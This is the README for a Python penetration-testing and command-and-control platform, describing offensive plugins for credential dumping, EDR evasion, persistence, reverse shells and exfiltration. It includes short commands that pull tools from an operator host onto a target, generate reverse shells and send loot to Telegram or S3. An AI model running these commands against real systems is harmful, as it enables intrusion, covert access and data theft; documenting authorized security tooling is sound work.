# NexShell v2 — Unified Pentest Operations Platform

<div align="center">

```
             .o oOOOOOOOo                                            OOOo
             Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
             OboO"".OOo. .oOOOOOo.    OOOo.oOOOOOo..'OO
             OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
             `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
             .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
             OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
            oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
           oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
          OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
          "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
             Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
             :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?
                          oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                          '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                               `$"  `OOOO' `O"Y ' `OOOO'  o
                                      OP"          : o
              Nexus of Shell Operations  *  Elite Reverse Shell Commander
```

![Python](https://img.shields.io/badge/Python-3.8+-purple?logo=python&logoColor=white)
![Version](https://img.shields.io/badge/Version-2.2.0-blueviolet)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-blue)
![License](https://img.shields.io/badge/License-MIT-lime)
![Author](https://img.shields.io/badge/Author-vulnquest58-orange)
![Files](https://img.shields.io/badge/Files-112%2B%20Python%20%7C%203MB-red)
![Lines](https://img.shields.io/badge/Lines-69%2C000%2B-green)
![Commands](https://img.shields.io/badge/CLI%20Commands-58-orange)
![Plugins](https://img.shields.io/badge/Plugins-58%20Professional-crimson)
![Tools](https://img.shields.io/badge/Tools%20Dir-linux%20%7C%20windows%20%7C%20scripts%20%7C%20loot-teal)

</div>

> **NexShell v2** is a **Unified Pentest Operations Platform** managing sessions, assets, findings, evidence, transport channels, operation scope, credential inventory, timelines, real-time web dashboards, and a **professional plugin engine** covering modern 2025/2026 attack vectors — all from a single REPL interface. Zero external dependencies except the stdlib.

---

## Real Stats (v2.2 — July 2026)

| Metric | Value |
|--------|-------|
| Python source files | **112+** |
| Total lines of code | **69,000+** |
| Total source size | **~3 MB** |
| CLI commands | **58** |
| Professional plugins | **58** |
| MITRE ATT&CK TTPs mapped | **30+** |
| Zero external dependencies | stdlib only |
| SQLite persistence | Yes |
| Real-time Web Dashboard | Yes |
| Cross-platform | Linux / Windows / macOS |

---

## What is New in v2

| Feature | v1 | v2 |
|---------|:--:|:--:|
| SQLite persistence | No | Yes |
| Real-time Web Dashboard | No | Yes |
| WebSocket + HTTP transport | No | Yes |
| Operation scope + timeline + checklist | No | Yes |
| Service inventory + credential store | No | Yes |
| Persistent notes | No | Yes |
| Engagement templates (4 types) | No | Yes |
| Asset inventory (Hosts) | No | Yes |
| Security findings | No | Yes |
| Evidence + chain of custody | No | Yes |
| MITRE ATT&CK mapping (30+ TTPs) | No | Yes |
| Attack playbooks | No | Yes |
| Automated workflows (DAG) | No | Yes |
| Professional plugin engine | No | Yes |
| Rule engine (8 built-in rules) | No | Yes |
| Report generation (MD/HTML/JSON) | No | Yes |
| Health monitor + analytics | No | Yes |
| OPSEC profiles (ghost/paranoid) | basic | Full |
| Event bus (async pub/sub) | No | Yes |
| 58 Professional Plugins | No | Yes |
| Cloud/K8s/AD/Container coverage | No | Yes |
| 2025-2026 CVE detection | No | Yes |
| Professional REPL (prompt_toolkit + Rich) | No | Yes |
| Tools directory (linux/windows/scripts/loot) | No | Yes |

---

## Architecture

```
nexshell/
|-- nexshell.py              # Main REPL -- 58 CLI commands, 4,600+ lines
|
|-- core/                    # Framework kernel
|   |-- event_bus.py         # Async pub/sub event dispatcher
|   |-- plugin.py            # NexPlugin base + auto-discovery registry
|   |-- rules.py             # Rule engine -- 8 auto-detection rules
|   |-- scheduler.py         # Priority task queue + background workers
|   `-- workflow.py          # DAG workflow engine -- 4 built-in workflows
|
|-- db/                      # SQLite persistence layer
|   |-- database.py          # NexDB -- full CRUD for all entities
|   `-- schema_v2.py         # Schema: hosts, findings, operations, evidence
|
|-- modules/                 # Transport + utilities
|   |-- transport.py         # TLS listener + HTTP tunnel v1
|   |-- transport_compat.py  # Backward compat shim
|   |-- transport/           # v2 enhanced transport package
|   |   |-- http_tunnel.py   # HTTP covert channel (XOR, multi-agent, jitter)
|   |   `-- websocket.py     # RFC 6455 WebSocket (multi-client, ping/pong)
|   |-- loot.py              # Loot collection -> SQLite
|   |-- ops.py               # Operations helpers
|   |-- opsec.py             # OPSEC profile enforcement
|   |-- session_manager.py   # Session lifecycle management
|   |-- ui.py                # UI helpers / Rich output
|   `-- windows.py           # Windows-specific utilities
|
|-- web/                     # Real-time Web Dashboard (stdlib only)
|   |-- server.py            # HTTP + WebSocket combined server
|   `-- templates/
|       |-- index.html       # Dark-mode dashboard -- 7 views
|       |-- style.css        # Premium CSS -- CSS vars, animations
|       `-- app.js           # Real-time WS client + REST fallback
|
|-- operations/              # Engagement management
|   |-- operation.py         # Operation workspace (scope, objectives)
|   |-- scope.py             # CIDR scope manager + in/out-of-scope check
|   |-- timeline.py          # Engagement timeline -- 10 event types
|   `-- checklist.py         # Pentest (25 items) + CTF (10 items) checklists
|
|-- inventory/               # Asset intelligence
|   |-- hosts.py             # HostInventory + FindingsManager + attack graph
|   |-- services.py          # ServiceInventory -- 60+ port maps, nmap parser
|   |-- credentials.py       # CredentialStore -- dedup, type detect, crack track
|   `-- tags.py              # Tagging system
|
|-- knowledge/               # OSINT + reference knowledge
|   |-- mitre.py             # MITRE ATT&CK (30+ TTPs) + PlaybookEngine
|   `-- notes.py             # Persistent notes -- search, pin, tag, export
|
|-- evidence/                # Chain of custody
|   `-- collector.py         # SHA256 hash, timestamp, ZIP export
|
|-- reports/                 # Report generation
|   `-- reporter.py          # Markdown + HTML + JSON output
|
|-- config/                  # Configuration management
|   |-- profiles.py          # 3 OPSEC profiles + 4 operator roles
|   `-- templates.py         # 4 engagement templates
|
|-- services/                # Platform services
|   `-- health.py            # Health monitor + analytics engine
|
|-- models/                  # Shared data models
|   `-- __init__.py          # Host, Service, Finding, Evidence, Operation
|
|-- plugins/                 # 58 auto-discovered professional plugins
|   |
|   |   # Wave 1 -- Core Recon & Post-Exploitation
|   |-- auto_enum_linux.py        # Linux post-exploitation enumeration v3.0
|   |-- auto_enum_windows.py      # Windows post-exploitation enumeration v3.0
|   |-- privesc_scanner.py        # Linux privilege escalation scanner v3.0
|   |-- cred_hunter.py            # Multi-source credential hunter v3.0
|   |-- network_scout.py          # Network discovery + banner grabbing v3.0
|   |-- persistence_check.py      # Persistence mechanism detection v3.0
|   |-- cloud_recon.py            # Cloud recon (AWS/GCP/Azure/K8s) v1.0
|   |-- ad_attack.py              # Active Directory attack suite v1.0
|   |-- container_escape.py       # Container/K8s escape detection v1.0
|   |-- lateral_mover.py          # Lateral movement vector assessment v1.0
|   |
|   |   # Wave 2 -- Advanced Attack Modules
|   |-- amsi_bypass.py            # AMSI bypass suite v2.0
|   |-- api_enum.py               # API endpoint enumeration v2.0
|   |-- artifact_cleaner.py       # Forensic artifact cleaner v2.0
|   |-- attack_path_analyzer.py   # Attack path analysis v2.0
|   |-- browser_cred_extractor.py # Browser credential extractor v2.0
|   |-- capabilities_exploiter.py # Linux capabilities exploiter v2.0
|   |-- data_exfiltrator.py       # Multi-channel data exfiltrator v2.0
|   |-- database_enum.py          # Database enumeration v2.0
|   |-- dns_enum.py               # DNS enumeration v2.0
|   |-- edr_evasion_suite.py      # EDR evasion techniques v2.0
|   |-- email_enum.py             # Email enumeration v2.0
|   |-- etw_patcher.py            # ETW event tracing patcher v2.0
|   |-- kernel_exploit_suggester.py # Kernel exploit suggester v2.0
|   |-- kernel_module_loader.py   # Kernel module loader v2.0
|   |-- lsass_dumper.py           # LSASS memory dumper v2.0
|   |-- network_pivot_detector.py # Network pivot detector v2.0
|   |-- network_topology_mapper.py # Network topology mapper v2.0
|   |-- ntds_extractor.py         # NTDS.dit extractor v2.0
|   |-- ntlm_relay_automator.py   # NTLM relay automator v2.0
|   |-- obfuscation_engine.py     # Multi-technique obfuscation v2.0
|   |-- pass_the_hash.py          # Pass-the-hash toolkit v2.0
|   |-- persistence_implanter.py  # Multi-mechanism persistence v2.0
|   |-- process_injection_suite.py # Process injection techniques v2.0
|   |-- psexec_automator.py       # PsExec automator v2.0
|   |-- rdp_pivot.py              # RDP pivot & hijacking v2.0
|   |-- risk_scoring_engine.py    # CVSS-based risk scoring v2.0
|   |-- sam_hive_extractor.py     # SAM hive extractor v2.0
|   |-- smb_exploiter.py          # SMB exploitation suite v2.0
|   |-- ssh_enum.py               # SSH enumeration v2.0
|   |-- ssh_pivot_automator.py    # SSH pivot automator v2.0
|   |-- sudo_abuse_suite.py       # Sudo abuse techniques v2.0
|   |-- timestomper.py            # Timestamp manipulation v2.0
|   |-- token_impersonator.py     # Windows token impersonation v2.0
|   |-- uac_bypass_suite.py       # UAC bypass suite v2.0
|   |-- vault_cred_extractor.py   # Windows Credential Manager v2.0
|   |-- web_app_enum.py           # Web application enumeration v2.0
|   |-- windows_kernel_exploit.py # Windows kernel exploits v2.0
|   |-- windows_privesc_automator.py # Windows privesc automation v2.0
|   `-- wmi_executor.py           # WMI-based execution v2.0
|   |
|   |   # Wave 3 -- Post-Exploitation Engine
|   |-- smart_tty_upgrade.py      # 7-stage TTY upgrade engine v2.0
|   |-- file_transfer_engine.py   # 12-method file transfer v2.0
|   |-- persistence_engine.py     # 16-mechanism persistence v2.0
|   |-- port_sniffer.py           # Port scan + session recorder v2.0
|   |-- local_file_sharer.py      # HTTP file share from tools/ v2.0
|   |-- reverse_shell_generator.py # 20+ payloads + obfuscation v2.0
|   |-- command_queue.py          # SQLite command queue + retry v2.0
|   `-- cloud_integration.py      # S3/Azure/GCS + notifications v2.0
|
`-- tools/                   # Shared tools directory
    |-- linux/               # Linux: linpeas, pspy64, socat, chisel...
    |-- windows/             # Windows: winpeas, mimikatz, Rubeus...
    |-- scripts/             # Helper scripts
    |-- loot/                # Extracted files (auto-populated)
    `-- README.md            # Usage guide
```

---

## Quick Start

```bash
git clone https://github.com/vulnquest58/nexshell
cd nexshell
python nexshell.py
```

```
(NexShell)> help               # Show all 58 commands
(NexShell)> web start          # Launch dashboard -> http://localhost:8888
(NexShell)> plugins list       # List all 58 loaded plugins
(NexShell)> health             # System health check
```

Optional - with prompt_toolkit + Rich (Metasploit-style):

```bash
pip install prompt_toolkit rich
python nexshell.py -p 4444             # Start with listener
python nexshell.py -p 4444 --op ops1  # Named operation
python nexshell.py --opsec ghost       # Ghost OPSEC mode
```

---

## Professional REPL

A Metasploit-style interactive interface built on `prompt_toolkit` + `Rich` (optional install).

| Feature | Details |
|---------|--------|
| Tab completion | All 58 commands + all 58 plugin names |
| History | Persistent across sessions (.nexshell/history) |
| Auto-suggest | Arrow right to accept suggestions from history |
| Bottom toolbar | Live sessions/listeners/plugins/opsec/time |
| Rich tables | help, sessions, plugins list, payloads |
| Progress spinner | Shows during plugin execution |
| -p PORT | Auto-start listeners at launch |
| --op NAME | Named operation context |
| --opsec PROFILE | normal / ghost / paranoid at startup |
| --no-banner | Skip banner for scripted use |

---

## Plugin System

NexShell ships with **58 professional-grade plugins** organized in three waves.
Every plugin features:

- Auto-finding generation with severity mapping (Critical/High/Medium/Low)
- MITRE ATT&CK technique tagging on every finding
- Exploitation guidance embedded in findings
- Automatic loot collection to SQLite
- EventBus integration for real-time dashboard push
- Coverage of 2025-2026 CVEs and modern attack vectors

### Wave 1 — Core Plugins (v3.0)

Upgraded from v2.0 with modern 2025-2026 threat coverage.

#### auto-enum-linux - Linux Post-Exploitation Enumeration

```
(NexShell)> plugins run auto-enum-linux
```

- System info, kernel, OS details
- Users, sudo rights, SUID/GUID binaries
- Network interfaces, open ports, ARP table
- Cloud/K8s context: AWS/GCP/Azure IMDS, K8s service account tokens
- eBPF process/socket tracking programs
- SELinux/AppArmor policy detection
- Sudo CVE-2023-22809 detection, PwnKit (CVE-2021-4034) detection
- 2025-2026 CVE checks: CVE-2025-32462/32463, CVE-2026-3888 (Snapd)

#### auto-enum-windows - Windows Post-Exploitation Enumeration

```
(NexShell)> plugins run auto-enum-windows
```

- System info, patches, installed software, local users, groups, privileges
- Entra ID (Azure AD): dsregcmd /status, PRT token detection
- Microsoft Defender exclusions, LAPS passwords, DPAPI blobs
- GPP cpassword in SYSVOL, AppLocker and WDAC policy extraction
- BitLocker status, WSUS-over-HTTP (MitM attack surface)
- Token manipulation: SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege

#### privesc-scanner - Linux Privilege Escalation Scanner

```
(NexShell)> plugins run privesc-scanner
```

- SUID/SGID binaries with GTFOBins mapping
- Sudo misconfigurations, world-writable files and cron jobs
- Kernel exploit mapping: CVE-2025-32462/32463, CVE-2026-3888, CVE-2024-1086, CVE-2023-4911
- Container/cloud breakout indicators, LD_PRELOAD abuse detection

#### cred-hunter - Multi-Source Credential Hunter

```
(NexShell)> plugins run cred-hunter
```

- Config files, shell histories, .env files, IaC & Terraform state files
- SaaS tokens: Stripe, Twilio, SendGrid, Vercel, NPM, GitHub, Slack
- Cloud credentials: AWS keys, GCP ADC, Azure tokens
- Database URIs, Docker registry configs, Kubernetes secrets
- SSH private keys, GPG keys, Browser saved passwords (Chrome/Firefox)

#### network-scout - Network Discovery & Enumeration

```
(NexShell)> plugins run network-scout --nmap
```

- Network interface enumeration (IPv4 + IPv6), nmap integration with banner grabbing
- Kubernetes & DevOps ports: 6443, 8080, 2379 (etcd), 10250 (kubelet)
- gRPC/Istio service mesh detection, SMBv1 EternalBlue detection
- Service fingerprinting for 80+ port types, firewall rule enumeration

#### persistence-check - Persistence Mechanism Detection

```
(NexShell)> plugins run persistence-check
```

Linux: systemd units, cron/at jobs, D-Bus/Polkit, udev rules, eBPF programs, MOTD scripts
Windows: Registry Run keys, Scheduled Tasks, COM hijacking, WMI subscriptions, IIS webshells
Cloud: Azure AD app secrets, CI/CD hook scripts (GitHub Actions, GitLab CI)

---

### Wave 2 — Advanced Attack Plugins (v1.0/v2.0)

New plugins targeting modern enterprise attack surfaces.

#### cloud-recon - Cloud Environment Enumeration

```
(NexShell)> plugins run cloud-recon --provider aws
(NexShell)> plugins run cloud-recon --deep
```

MITRE: T1552.005

- AWS (16 checks): IMDSv1/v2, IAM credential chain, ECS/Lambda credentials, SSO tokens
- GCP (12 checks): Metadata service, service account OAuth2 tokens, ADC credentials
- Azure (9 checks): IMDS, Managed Identity tokens (ARM/Key Vault/Graph), CLI token cache
- Kubernetes (12 checks): ServiceAccount JWT, RBAC enumeration, cluster-admin detection
- IaC (7 checks): Terraform state, .tfvars, Pulumi credentials, Ansible vault files

#### ad-attack - Active Directory Attack Suite

```
(NexShell)> plugins run ad-attack
(NexShell)> plugins run ad-attack --adcs
```

MITRE: T1558

- Kerberoasting, AS-REP Roasting, Unconstrained/Constrained/RBCD delegation
- AD CS ESC1-ESC11: Vulnerable template detection, SubCA abuse, Web Enrollment
- Shadow Credentials, GMSA password extraction, RODC abuse
- DCSync ACEs, GenericAll/WriteDACL, AdminSDHolder, DNS Admins DLL injection
- Auto-generates exploitation chains at scan completion
- Relevant CVEs: CVE-2024-21320 (Kerberos Relay), CVE-2021-1675 (PrintNightmare), CVE-2022-26923 (AD CS)

#### container-escape - Container & Kubernetes Security

```
(NexShell)> plugins run container-escape --k8s-only
```

MITRE: T1611 — Escape to Host

| CVE | Software | Description | Severity |
|-----|----------|-------------|----------|
| CVE-2024-21626 | runc < 1.1.12 | Leaky Vessels workingDir escape | Critical |
| CVE-2024-10220 | runc < 1.1.13 | Container breakout | Critical |
| CVE-2024-41110 | Docker < 27.3.1 | AuthZ plugin bypass | Critical |
| CVE-2024-45310 | containerd < 1.7.22 | shim API escape | Critical |
| CVE-2023-2640/32629 | Ubuntu OverlayFS | LPE (AlienCrash) | Critical |
| CVE-2019-5736 | runc < 1.0.0 | runc exec overwrite | Critical |

#### lateral-mover - Lateral Movement Vector Assessment

```
(NexShell)> plugins run lateral-mover --subnet 192.168.1.0/24
```

MITRE: T1021

- Windows: Kerberos ticket cache, WDigest detection, SMB signing, LLMNR/NBT-NS
- Linux: Kerberos cache files, SSH keys, known_hosts, .netrc/.pgpass credentials
- Remote: SMB null sessions, ADMIN$/C$ access, WMI/WinRM/SSH enumeration (up to 20 hosts)
- Auto-generates actionable lateral movement attack chains

---

### Wave 3 — Post-Exploitation Engine (v2.0)

Advanced post-exploitation suite. Zero external dependencies — stdlib only.

#### smart-tty-upgrade - 7-Stage TTY Upgrade

```
(NexShell)> plugins run smart-tty-upgrade --stage python
```

Auto-detects: python3 -> python -> perl -> expect -> socat -> script -> /bin/sh
MITRE: T1059

#### file-transfer-engine - 12-Method File Transfer

```
(NexShell)> plugins run file-transfer-engine --upload /path/to/file
(NexShell)> plugins run file-transfer-engine --detect
```

Linux: base64, wget, curl, python3-http, nc, socat, scp, rsync
Windows: certutil, PowerShell IWR, bitsadmin, mshta
SHA256 integrity verification + OPSEC-aware method selection
MITRE: T1105

#### persistence-engine - 16-Mechanism Persistence

```
(NexShell)> plugins run persistence-engine --mechanism systemd
(NexShell)> plugins run persistence-engine --auto-reconnect --lhost 10.0.0.1 --lport 4444
```

MITRE: T1547, T1053, T1543, T1546

| Mechanism | Platform | Root? | Risk |
|-----------|----------|-------|------|
| User Crontab | Linux | No | Medium |
| System Crontab | Linux | Yes | High |
| Systemd User Service | Linux | No | Low |
| Systemd System Service | Linux | Yes | Medium |
| SSH Authorized Keys | Linux | No | Medium |
| Registry Run HKCU | Windows | No | Low |
| Registry Run HKLM | Windows | Yes | Medium |
| Scheduled Task | Windows | No | Medium |
| WMI Event Subscription | Windows | Yes | Medium |
| Windows Service | Windows | Yes | Medium |

#### port-sniffer - Port Scanner & Session Recorder

```
(NexShell)> plugins run port-sniffer --scan --target 192.168.1.5
(NexShell)> plugins run port-sniffer --record=4444
```

Parallel scan of ports 1000-9999 (200 threads), background TCP session recording to timestamped .log files
MITRE: T1040, T1049

#### local-file-sharer - Smart HTTP File Server

```
(NexShell)> plugins run local-file-sharer --linux
(NexShell)> plugins run local-file-sharer --windows
```

Auto port detection (9001-9100), wget/curl/PowerShell download commands, download counter
MITRE: T1105

#### reverse-shell-gen - 20+ Payload Generator

```
(NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444
(NexShell)> plugins run reverse-shell-gen --lang python3 --obfuscate
```

Linux: bash, python3, perl, ruby, php, awk, socat, netcat, openssl, nodejs
Windows: PowerShell, PowerShell-Base64, python3, mshta, certutil
Obfuscation: Base64, variable substitution, char array, AMSI bypass wrapper
MITRE: T1059, T1027

#### command-queue - SQLite Command Queue

```
(NexShell)> plugins run command-queue --add "whoami" --session 1 --priority 1
(NexShell)> plugins run command-queue --run --session 1
```

SQLite-backed, priority-based (1=highest, 10=lowest), exponential backoff retry, dry-run mode
MITRE: T1651

#### cloud-integration - Cloud Exfil & Notifications

```
(NexShell)> plugins run cloud-integration --telegram --token T --chat C --msg "pwned!"
(NexShell)> plugins run cloud-integration --s3 PRESIGNED_URL --upload-loot
```

Upload: AWS S3, Azure Blob, GCS, custom HTTP
Notify: Telegram Bot API, Discord Webhook, Slack Incoming Webhook
MITRE: T1567, T1567.002

---

## CLI Commands Reference

### Transport & Shells

| Command | Description |
|---------|-------------|
| `listeners` | Manage reverse shell listeners |
| `connect` | Connect to a listener |
| `payloads` | Generate reverse shell payloads |
| `transport list` | List all transport types (tcp/tls/http/ws/doh) |
| `transport http [port]` | Start HTTP covert channel server |
| `transport ws [port]` | Start WebSocket C2 server |
| `transport agent <type> <host> <port>` | Generate agent payload |

### Session Operations

| Command | Description |
|---------|-------------|
| `sessions` | List all sessions |
| `use <id>` | Interact with session |
| `run <cmd>` | Run command in active session |
| `upload / download` | File transfer |
| `quickenum` | Auto enumeration |
| `privesc` | Privilege escalation suggestions |
| `credharvest` | Auto credential harvest |

### Operation Management

| Command | Description |
|---------|-------------|
| `operation new <name>` | Create new engagement |
| `operation active` | Show active operation |
| `scope add <ip/cidr>` | Add IP/CIDR to scope |
| `scope check <ip>` | Check if IP is in scope |
| `timeline add <event>` | Record engagement event |
| `timeline show` | Display ASCII timeline |
| `checklist show` | Show engagement checklist |
| `checklist complete <key>` | Mark item complete |
| `template list` | List engagement templates |
| `template apply <name>` | Apply template to operation |

### Asset Intelligence

| Command | Description |
|---------|-------------|
| `host add <ip>` | Add host to inventory |
| `host list` | List all hosts |
| `svc add <ip> <port>` | Add service |
| `svc interesting` | Show high-value services |
| `creds add` | Add credential manually |
| `creds hashes` | Show all hashes |
| `graph` | ASCII attack graph |
| `finding add` | Add security finding |

### Knowledge & Notes

| Command | Description |
|---------|-------------|
| `note add [text]` | Add persistent note |
| `note search <kw>` | Search notes |
| `note pin <id>` | Pin important note |
| `mitre list` | List MITRE techniques |
| `mitre search <term>` | Search techniques |
| `playbook run <name>` | Run attack playbook |

### Evidence & Reporting

| Command | Description |
|---------|-------------|
| `evidence capture <file>` | Capture evidence with hash |
| `evidence export` | Export ZIP archive |
| `report generate` | Generate pentest report |
| `report generate --format html` | HTML report |

### Platform

| Command | Description |
|---------|-------------|
| `health` | Full health check |
| `stats` | Analytics dashboard |
| `config show` | Show active OPSEC profile |
| `config set ghost` | Switch to ghost mode |
| `plugins list` | List loaded plugins |
| `plugins run <name>` | Execute plugin in active session |
| `plugins info <name>` | Show plugin metadata + MITRE IDs |
| `workflow list` | List available workflows |
| `workflow run <name>` | Execute workflow |
| `db stats` | Database statistics |
| `web start [port]` | Launch dashboard (default :8888) |
| `web stop` | Stop dashboard server |

---

## Web Dashboard

The real-time web dashboard is served at http://localhost:8888 (configurable).

```
(NexShell)> web start 8888
[+] Dashboard started -> http://localhost:8888
```

| View | Description |
|------|-------------|
| Dashboard | Live stat cards + activity feed + recent findings |
| Sessions | All active and historical sessions |
| Hosts | Asset inventory with risk scores |
| Findings | Security findings with severity filter |
| Loot | Collected loot with category/source |
| MITRE ATT&CK | Observed techniques heatmap |
| Operation | Current engagement details |

Features: Real-time WebSocket push (every 3 seconds), REST API fallback, Alt+1 through Alt+7 keyboard shortcuts, zero dependencies.

---

## Transport Channels

| Channel | Stealth | Use Case |
|---------|---------|----------|
| tcp | Low | Internal networks |
| tls | High | TLS 1.3 encrypted |
| http | High | HTTP POST tunneling |
| https | Maximum | HTTPS (self-signed) |
| websocket | High | Browser-like traffic |
| wss | Maximum | WS over TLS |
| doh | Maximum | DNS-over-HTTPS exfil |

Generate agents:

```bash
(NexShell)> transport agent http 10.10.14.1 8080 /api/ping 5
(NexShell)> transport agent https 10.10.14.1 8443 /api/ping
(NexShell)> transport agent powershell 10.10.14.1 8080 /api/ping
(NexShell)> transport agent python 10.10.14.1 8080 /api/ping
(NexShell)> transport agent ws 10.10.14.1 9001 /
(NexShell)> transport agent ws-python 10.10.14.1 9001 /
```

---

## Plugin Development

```python
from core.plugin import NexPlugin

class MyPlugin(NexPlugin):
    name        = "my-plugin"
    description = "Does something useful"
    author      = "you"
    version     = "1.0"
    platform    = "linux"      # linux / windows / all
    category    = "recon"      # recon / privesc / lateral
    mitre_id    = "T1082"

    def run(self, session, args: list):
        out = self._exec(session, "id; whoami; hostname")
        self.loot(out, category="auto_enum")
        self.finding(
            title          = "Low privilege shell obtained",
            description    = out[:500],
            severity       = "Info",
            recommendation = "Escalate privileges",
            mitre_id       = self.mitre_id,
        )
        self.emit("finding.created", severity="info", plugin=self.name)
        return out
```

Drop the file in `plugins/` — auto-discovered on startup with no registration needed.

---

## Engagement Templates

| Template | Type | OPSEC | Use Case |
|----------|------|-------|----------|
| internal_pentest | pentest | normal | Internal network assessment |
| external_pentest | pentest | normal | External perimeter test |
| red_team | red_team | paranoid | Full red team engagement |
| ctf | ctf | normal | CTF competitions |

---

## OPSEC Profiles

| Profile | Logging | Delay | Use Case |
|---------|---------|-------|----------|
| normal | full | none | Internal assessments |
| ghost | minimal | 0-1s | Evasion-aware tests |
| paranoid | none | 1-3s | APT simulation |

---

## Event Bus

```python
from core.event_bus import bus
bus.subscribe('session.connected', lambda **kw: print("New session!", kw))
bus.emit('finding.created', severity='high', host='10.0.0.1', title='SQLi')
```

| Event | Triggered by |
|-------|-------------|
| session.connected | New reverse shell |
| session.disconnected | Shell died |
| loot.added | New loot collected |
| finding.created | Security finding added (incl. plugins) |
| host.added | New host discovered |
| cred.discovered | Credential found |
| rule.triggered | Rule engine match |
| plugin.ran | Plugin executed |

---

## MITRE ATT&CK Coverage

| Plugin | Primary Technique | Additional Techniques |
|--------|------------------|-----------------------|
| auto-enum-linux | T1082 System Information Discovery | T1033, T1016, T1049 |
| auto-enum-windows | T1082 System Information Discovery | T1033, T1016, T1518 |
| privesc-scanner | T1548 Abuse Elevation Control | T1068, T1055 |
| cred-hunter | T1552 Unsecured Credentials | T1555, T1083 |
| network-scout | T1046 Network Service Discovery | T1018, T1135 |
| persistence-check | T1547 Boot or Logon Autostart | T1053, T1543, T1546 |
| cloud-recon | T1552.005 Cloud Instance Metadata | T1078.004, T1613 |
| ad-attack | T1558 Steal/Forge Kerberos Tickets | T1484, T1552.001 |
| container-escape | T1611 Escape to Host | T1613, T1552.005 |
| lateral-mover | T1021 Remote Services | T1550, T1558.003 |
| smart-tty-upgrade | T1059 Command & Scripting Interpreter | T1027, T1140 |
| file-transfer-engine | T1105 Ingress Tool Transfer | T1027.010, T1071 |
| persistence-engine | T1547 Boot/Logon Autostart | T1053, T1543, T1546 |
| port-sniffer | T1040 Network Sniffing | T1049, T1046 |
| local-file-sharer | T1105 Ingress Tool Transfer | T1071.001 |
| reverse-shell-gen | T1059 Command & Scripting Interpreter | T1027, T1055 |
| command-queue | T1651 Cloud Administration Command | T1059 |
| cloud-integration | T1567 Exfiltration Over Web Service | T1567.002 |

---

## Tools Directory

```
nexshell/tools/
|-- linux/     <- linpeas.sh, pspy64, socat, chisel, ligolo-ng...
|-- windows/   <- winpeas.exe, mimikatz.exe, Rubeus.exe, SharpHound.exe...
|-- scripts/   <- Custom helper scripts
`-- loot/      <- Files extracted from targets (auto-populated)
```

One-command sharing:

```bash
(NexShell)> plugins run local-file-sharer

# On target:
wget http://10.10.10.10:9001/linpeas.sh
curl -s http://10.10.10.10:9001/winpeas.exe -o winpeas.exe
powershell -c "iwr 'http://10.10.10.10:9001/Rubeus.exe' -OutFile 'Rubeus.exe'"
```

---

## Database

SQLite database at `nexshell.db` — zero configuration needed.

```bash
(NexShell)> db stats            # Show record counts
(NexShell)> db search loot admin  # Search loot
(NexShell)> db export           # Export full JSON dump
(NexShell)> db vacuum           # VACUUM (compact DB)
```

Schema tables: `sessions`, `loot`, `hosts`, `findings`, `operations`, `evidence`, `operation_scope`, `operation_objectives`

---

## Stats

```
112 Python files  *  3 web files  *  69,000+ lines  *  ~3 MB
58 CLI commands  *  58 professional plugins  *  30+ MITRE ATT&CK TTPs
0 external dependencies  *  SQLite persistence  *  tools/ shared workspace
Wave 1 (10 plugins)  *  Wave 2 (40 plugins)  *  Wave 3 (8 plugins)
```

---

## Roadmap — v3 (Coming Soon)

The following features are planned for the upcoming **v3 major release**:

- AI-Assisted Attack Path Generation — LLM-powered exploitation recommendations
- Collaborative Multi-Operator Mode — Shared sessions & findings in real-time
- Plugin Marketplace — Community plugin distribution with signature verification
- C2 Framework Integration — Native Sliver, Havoc, and Mythic connector
- Automated Report Generation — Professional PDF/DOCX pentest reports
- REST API Server — Full REST interface for external tool integration
- Docker Container — Official containerized deployment
- Plugin Testing Framework — Unit/integration test harness for plugins
- Enhanced Cloud Coverage — OCI, Alibaba Cloud, DigitalOcean support
- TUI Dashboard — Full terminal UI with split-pane views

Development is active — contributions and feedback welcome via GitHub Issues.

---

## License

MIT License — for authorized security testing only.

> Warning: Use only on systems you own or have explicit written permission to test.
> This tool is intended for professional penetration testers and security researchers.
